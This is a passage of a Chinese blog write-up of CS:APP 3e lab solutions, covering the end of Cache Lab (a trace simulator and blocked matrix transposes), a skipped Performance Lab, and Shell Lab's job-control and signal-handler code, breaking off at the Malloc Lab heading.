class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">simulate</span><span class="hljs-params">(FILE* file, <span class="hljs-type">bool</span> verbose, line** cache)</span>&#123;<br>    <span class="hljs-type">char</span>          operation;<br>    <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> mem_address;<br>    <span class="hljs-type">int</span>           size;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(file,<span class="hljs-string">&quot; %c %lx,%d&quot;</span>,&amp;operation,&amp;mem_address,&amp;size)!=EOF)&#123;<br>        <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c %lx,%d&quot;</span>, operation, mem_address, size);<br>        <span class="hljs-keyword">switch</span>(operation)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;M&#x27;</span>:cache_operation(mem_address, verbose, cache);<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;L&#x27;</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;S&#x27;</span>:cache_operation(mem_address, verbose, cache);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    fclose(file);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Part-B-1"><a href="#Part-B-1" class="headerlink" title="Part B"></a>Part B</h3><p>优化矩阵转置，增加缓存命中率。</p><p>根据实验文档的说明，缓存为32组的直接映射缓存，每行数据块大小为32个字节（8个整数），总大小为256个整数。对于大小为32×32, 64×64, 61×67矩阵，最大未命中次数分别为300, 1300, 2000。</p><h4 id="32×32"><a href="#32×32" class="headerlink" title="32×32"></a>32×32</h4><p>缓存的容量为8行，对A矩阵以8行为步长遍历，将每一行装入缓存后写入B矩阵的相应位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> i, j, tmp;<br><span class="hljs-keyword">if</span>(M==<span class="hljs-number">32</span>&amp;&amp;N==<span class="hljs-number">32</span>)&#123;<br>    <span class="hljs-type">int</span> var0,var1,var2,var3,var4,var5,var6,var7;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i+=<span class="hljs-number">8</span>)&#123;<br>        <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;M;j+=<span class="hljs-number">8</span>)&#123;<br>            <span class="hljs-keyword">for</span>(tmp=i;tmp&lt;i+<span class="hljs-number">8</span>;tmp+=<span class="hljs-number">1</span>)&#123;<br>                var0=A[tmp][j]  ;var1=A[tmp][j+<span class="hljs-number">1</span>];var2=A[tmp][j+<span class="hljs-number">2</span>];var3=A[tmp][j+<span class="hljs-number">3</span>];<br>                var4=A[tmp][j+<span class="hljs-number">4</span>];var5=A[tmp][j+<span class="hljs-number">5</span>];var6=A[tmp][j+<span class="hljs-number">6</span>];var7=A[tmp][j+<span class="hljs-number">7</span>];<br>                B[j][tmp]  =var0;B[j+<span class="hljs-number">1</span>][tmp]=var1;B[j+<span class="hljs-number">2</span>][tmp]=var2;B[j+<span class="hljs-number">3</span>][tmp]=var3;<br>                B[j+<span class="hljs-number">4</span>][tmp]=var4;B[j+<span class="hljs-number">5</span>][tmp]=var5;B[j+<span class="hljs-number">6</span>][tmp]=var6;B[j+<span class="hljs-number">7</span>][tmp]=var7;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>用参数<code>-M 32 -N 32</code>测试该函数：</p><p><img src="/CSAPP3e_WP/image-20240202145227226-172450357943937.png" alt="image-20240202145227226" style="zoom:67%;" align="left"></p><h4 id="64×64"><a href="#64×64" class="headerlink" title="64×64"></a>64×64</h4><p>缓存的容量为4行，只能对A矩阵每个8×8的块分为4×4的块进行操作，可以一次缓存8×4的数据。</p><p>第一次缓存A矩阵前4行：</p><p>1a. A矩阵左上角块16个→转置后填入B矩阵左上角。</p><p>1b. A矩阵右上角块16个→转置后填入B矩阵右上角。</p><p>第二次缓存A矩阵后4行：</p><p>2a. B矩阵右上角块16个→搬移至B矩阵左下角</p><p>2b. A矩阵左下角块16个→转置后填入B矩阵右上角。</p><p>3.A矩阵右下角块16个→转置后填入B矩阵右下角。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(M==<span class="hljs-number">64</span>&amp;&amp;N==<span class="hljs-number">64</span>)&#123;<br>    <span class="hljs-type">int</span> var0,var1,var2,var3,var4,var5,var6,var7;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i+=<span class="hljs-number">8</span>)&#123;<br>            <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;M;j+=<span class="hljs-number">8</span>)&#123;<br>                <span class="hljs-keyword">for</span>(tmp=i;tmp&lt;i+<span class="hljs-number">4</span>;tmp+=<span class="hljs-number">1</span>)&#123;<br>                    <span class="hljs-comment">//step1a+1b</span><br>                    var0=A[tmp][j]  ;var1=A[tmp][j+<span class="hljs-number">1</span>];var2=A[tmp][j+<span class="hljs-number">2</span>];var3=A[tmp][j+<span class="hljs-number">3</span>];<br>                    var4=A[tmp][j+<span class="hljs-number">4</span>];var5=A[tmp][j+<span class="hljs-number">5</span>];var6=A[tmp][j+<span class="hljs-number">6</span>];var7=A[tmp][j+<span class="hljs-number">7</span>];<br>                    B[j][tmp]  =var0;B[j+<span class="hljs-number">1</span>][tmp]  =var1;B[j+<span class="hljs-number">2</span>][tmp]  =var2;B[j+<span class="hljs-number">3</span>][tmp]  =var3;<br>                    B[j][tmp+<span class="hljs-number">4</span>]=var4;B[j+<span class="hljs-number">1</span>][tmp+<span class="hljs-number">4</span>]=var5;B[j+<span class="hljs-number">2</span>][tmp+<span class="hljs-number">4</span>]=var6;B[j+<span class="hljs-number">3</span>][tmp+<span class="hljs-number">4</span>]=var7;<br>                &#125;<br>                <span class="hljs-keyword">for</span>(tmp=j;tmp&lt;j+<span class="hljs-number">4</span>;tmp+=<span class="hljs-number">1</span>)&#123;<br>                    <span class="hljs-comment">//step2a+2b</span><br>                    var0=A[i+<span class="hljs-number">4</span>][tmp];var1=A[i+<span class="hljs-number">5</span>][tmp];var2=A[i+<span class="hljs-number">6</span>][tmp];var3=A[i+<span class="hljs-number">7</span>][tmp];<br>                    var4=B[tmp][i+<span class="hljs-number">4</span>];var5=B[tmp][i+<span class="hljs-number">5</span>];var6=B[tmp][i+<span class="hljs-number">6</span>];var7=B[tmp][i+<span class="hljs-number">7</span>];<br>                    B[tmp][i+<span class="hljs-number">4</span>]=var0;B[tmp][i+<span class="hljs-number">5</span>]=var1;B[tmp][i+<span class="hljs-number">6</span>]=var2;B[tmp][i+<span class="hljs-number">7</span>]=var3;<br>                    B[tmp+<span class="hljs-number">4</span>][i]=var4;B[tmp+<span class="hljs-number">4</span>][i+<span class="hljs-number">1</span>]=var5;B[tmp+<span class="hljs-number">4</span>][i+<span class="hljs-number">2</span>]=var6;B[tmp+<span class="hljs-number">4</span>][i+<span class="hljs-number">3</span>]=var7;<br>                &#125;<br>                <span class="hljs-keyword">for</span>(tmp=i+<span class="hljs-number">4</span>;tmp&lt;i+<span class="hljs-number">8</span>;tmp+=<span class="hljs-number">1</span>)&#123;<br>                   <span class="hljs-comment">//step3</span><br>                    var4=A[tmp][j+<span class="hljs-number">4</span>];var5=A[tmp][j+<span class="hljs-number">5</span>];var6=A[tmp][j+<span class="hljs-number">6</span>];var7=A[tmp][j+<span class="hljs-number">7</span>];<br>                    B[j+<span class="hljs-number">4</span>][tmp]=var4;B[j+<span class="hljs-number">5</span>][tmp]=var5;B[j+<span class="hljs-number">6</span>][tmp]=var6;B[j+<span class="hljs-number">7</span>][tmp]=var7;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>用参数<code>-M 64 -N 64</code>测试该函数：</p><p><img src="/CSAPP3e_WP/image-20240202164732726-172450358245639.png" alt="image-20240202164732726" style="zoom:67%;" align="left"></p><h4 id="61-times-67"><a href="#61-times-67" class="headerlink" title="61$\times$67"></a>61$\times$67</h4><p>M和N对于缓存容量而言难以对齐，设块大小为$b\times b$，算法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(M==<span class="hljs-number">61</span>&amp;&amp;N==<span class="hljs-number">67</span>)&#123;<br>    <span class="hljs-type">int</span> chunk_i, chunk_j;<br><span class="hljs-type">int</span> b = BLOCK_SIZE;<span class="hljs-comment">//TBD</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += b) &#123;<br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; M; j += b) &#123;<br>        <span class="hljs-keyword">for</span> (chunk_i = i; chunk_i &lt; N &amp;&amp; chunk_i &lt; i + b; chunk_i+=<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">for</span> (chunk_j = j; chunk_j &lt; M &amp;&amp; chunk_j &lt; j + b; chunk_j+=<span class="hljs-number">1</span>) &#123;<br>                tmp = A[chunk_i][chunk_j];<br>                B[chunk_j][chunk_i] = tmp;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>不妨令b适当大些，取b&#x3D;16，用参数<code>-M 61 -N 67</code>测试该函数：</p><p><img src="/CSAPP3e_WP/image-20240202170120119-172450358557541.png" alt="image-20240202170120119" style="zoom:67%;" align="left"></p><p><strong>*为了在现代的环境上运行评测脚本，你可能需要安装2to3用于转换脚本为符合Python3语法规则的版本。</strong></p><h2 id="5b-Performance-Lab-Omitted"><a href="#5b-Performance-Lab-Omitted" class="headerlink" title="5b. Performance Lab(Omitted)"></a>5b. Performance Lab(Omitted)</h2><p>这个实验年代久远、太无聊、编码过程繁琐，并且评测脚本没有定量的评分目标，懒得做。</p><h2 id="6-Shell-Lab-信号游戏"><a href="#6-Shell-Lab-信号游戏" class="headerlink" title="6. Shell Lab: 信号游戏"></a>6. Shell Lab: 信号游戏</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>大部分代码来自CS:APP 3e Figure 8.24，父进程在<code>fork</code>子进程之前，必须先用<code>sigprocmask</code>阻塞SIGCHLD信号，在调用<code>addjob</code>将子进程加入作业列表后取消该阻塞，子进程取消阻塞SIGCHLD信号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * eval - Evaluate the command line that the user has just typed in</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span><br><span class="hljs-comment"> * then execute it immediately. Otherwise, fork a child process and</span><br><span class="hljs-comment"> * run the job in the context of the child. If the job is running in</span><br><span class="hljs-comment"> * the foreground, wait for it to terminate and then return.  Note:</span><br><span class="hljs-comment"> * each child process must have a unique process group ID so that our</span><br><span class="hljs-comment"> * background children don&#x27;t receive SIGINT (SIGTSTP) from the kernel</span><br><span class="hljs-comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">eval</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmdline)</span> <br>&#123;<br>    <span class="hljs-type">char</span> *argv[MAXARGS]; <span class="hljs-comment">/* Argument list execve() */</span><br>    <span class="hljs-type">char</span> buf[MAXLINE];   <span class="hljs-comment">/* Holds modified command line */</span><br>    <span class="hljs-type">int</span> bg;              <span class="hljs-comment">/* Should the job run in bg or fg? */</span><br>    <span class="hljs-type">pid_t</span> pid;           <span class="hljs-comment">/* Process id */</span><br>    <br>    <span class="hljs-built_in">strcpy</span>(buf, cmdline);<br>    bg = parseline(buf, argv); <br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">0</span>] == <span class="hljs-literal">NULL</span>)  <br><span class="hljs-keyword">return</span>;   <span class="hljs-comment">/* Ignore empty lines */</span><br><br>    <span class="hljs-type">sigset_t</span> mask,prev,mask_all;<br>    sigfillset(&amp;mask_all);<br>    sigemptyset(&amp;mask);<br>    sigaddset(&amp;mask,SIGCHLD);<br>    <span class="hljs-keyword">if</span> (!builtin_cmd(argv)) &#123; <br>    sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev);<br><span class="hljs-keyword">if</span> ((pid = fork()) == <span class="hljs-number">0</span>) &#123;   <span class="hljs-comment">/* Child runs user job */</span><br>        sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);    <span class="hljs-comment">//unblock child</span><br>        setpgid(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (execve(argv[<span class="hljs-number">0</span>], argv, environ) &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br>    sigprocmask(SIG_BLOCK,&amp;mask_all,<span class="hljs-literal">NULL</span>);<br>    addjob(jobs,pid,bg?BG:FG,cmdline);<br>    sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">/* Parent waits for foreground job to terminate */</span><br><span class="hljs-keyword">if</span> (!bg) waitfg(pid);<br><span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>,pid2jid(pid), pid, cmdline);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h3><p>只需识别<code>quit</code>, <code>fg</code>, <code>bg</code>, <code>jobs</code>命令，根据字符串比较结果调用相应函数即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * builtin_cmd - If the user has typed a built-in command then execute</span><br><span class="hljs-comment"> *    it immediately.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">builtin_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;quit&quot;</span>)==<span class="hljs-number">0</span>)<span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;fg&quot;</span>)==<span class="hljs-number">0</span>||<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;bg&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>        do_bgfg(argv);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;jobs&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>        listjobs(jobs);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;     <span class="hljs-comment">/* not a builtin command */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h3><p>先获取对应作业，再根据输入的命令是<code>fg</code>或<code>bg</code>切换作业到前(后)台运行，发送<code>SIGCONT</code>信号使它重启。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * do_bgfg - Execute the builtin bg and fg commands</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">do_bgfg</span><span class="hljs-params">(<span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">char</span> *op=argv[<span class="hljs-number">0</span>],*id=argv[<span class="hljs-number">1</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span>* <span class="hljs-title">job</span>;</span><br>    <span class="hljs-keyword">if</span>(id==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong argument\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//get job by jid/pid</span><br>    <span class="hljs-keyword">if</span>(id[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;%&#x27;</span>)&#123;<br>        <span class="hljs-keyword">if</span>( (job=getjobjid(jobs,atoi(id+<span class="hljs-number">1</span>))) ==<span class="hljs-literal">NULL</span> )&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: No such job\n&quot;</span>,id);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(atoi(id)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">if</span>( (job=getjobpid(jobs,atoi(id))) ==<span class="hljs-literal">NULL</span> )&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: No such process\n&quot;</span>,atoi(id));<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong argument\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// switch job state</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(op,<span class="hljs-string">&quot;fg&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>        job-&gt;state=FG;<br>        kill(-job-&gt;pid,SIGCONT);<br>        waitfg(-job-&gt;pid);<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(op,<span class="hljs-string">&quot;bg&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>        job-&gt;state=BG;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);<br>        kill(-job-&gt;pid,SIGCONT);<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>前台作业数量至多为1，用<code>sigsuspend</code>保持阻塞，直到前台作业结束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * waitfg - Block until process pid is no longer the foreground process</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">waitfg</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid)</span><br>&#123;<br>    <span class="hljs-type">sigset_t</span> mask;<br>    sigemptyset(&amp;mask);<br>    <span class="hljs-keyword">while</span>(fgpid(jobs))sigsuspend(&amp;mask);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h3><p>循环调用<code>waitpid</code>检测子进程是否终止或停止，以确保回收所有子进程。根据子进程不同状态分别处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span><br><span class="hljs-comment"> *     a child job terminates (becomes a zombie), or stops because it</span><br><span class="hljs-comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span><br><span class="hljs-comment"> *     available zombie children, but doesn&#x27;t wait for any other</span><br><span class="hljs-comment"> *     currently running children to terminate.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigchld_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br>    <span class="hljs-type">int</span> prev_errno=errno;<br>    <span class="hljs-type">int</span> status;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">job_t</span> *<span class="hljs-title">job</span>;</span><br>    <span class="hljs-type">sigset_t</span> mask, prev;<br>    sigfillset(&amp;mask);<br>    <span class="hljs-keyword">while</span>( (pid=waitpid(<span class="hljs-number">-1</span>,&amp;status,WNOHANG|WUNTRACED)) &gt; <span class="hljs-number">0</span> )&#123;<br>        sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev);<br>        <span class="hljs-keyword">if</span>(WIFEXITED(status))deletejob(jobs,pid);   <span class="hljs-comment">//exited normally</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(WIFSTOPPED(status))&#123;<br>            <span class="hljs-comment">//stopped by signal</span><br>            job = getjobpid(jobs, pid);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>,job-&gt;jid,pid,WSTOPSIG(status));<br>            job-&gt;state=ST;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(WIFSIGNALED(status))&#123;<br>            <span class="hljs-comment">//terminated by signal</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>,pid2jid(pid),pid,WTERMSIG(status));<br>            deletejob(jobs,pid);        <br>        &#125;<br>        sigprocmask(SIG_SETMASK,&amp;prev,<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    errno=prev_errno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sigint-handler-sigtstp-handler"><a href="#sigint-handler-sigtstp-handler" class="headerlink" title="sigint_handler, sigtstp_handler"></a>sigint_handler, sigtstp_handler</h3><p>处理逻辑相似：获取前台进程的PID，用<code>kill</code>函数对进程组的所有进程发送相应信号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * sigint_handler - The kernel sends a SIGINT to the shell whenver the</span><br><span class="hljs-comment"> *    user types ctrl-c at the keyboard.  Catch it and send it along</span><br><span class="hljs-comment"> *    to the foreground job.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigint_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br><span class="hljs-type">int</span> prev_errno=errno;<br>    <span class="hljs-type">pid_t</span> pid=fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)kill(-pid,SIGINT);<br>    errno=prev_errno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span><br><span class="hljs-comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span><br><span class="hljs-comment"> *     foreground job by sending it a SIGTSTP.  </span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sigtstp_handler</span><span class="hljs-params">(<span class="hljs-type">int</span> sig)</span> <br>&#123;<br>    <span class="hljs-type">int</span> prev_errno=errno;<br>    <span class="hljs-type">pid_t</span> pid=fgpid(jobs);<br>    <span class="hljs-keyword">if</span>(pid&gt;<span class="hljs-number">0</span>)kill(-pid,SIGTSTP);<br>    errno=prev_errno;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-Malloc-Lab-欢迎来到SIGSEGV的世界"><a href="#7-Malloc-Lab-欢迎来到SIGSEGV的世界" class="headerlink" title="7. Malloc Lab: 欢迎来到SIGSEGV的世界"></a>7. Malloc 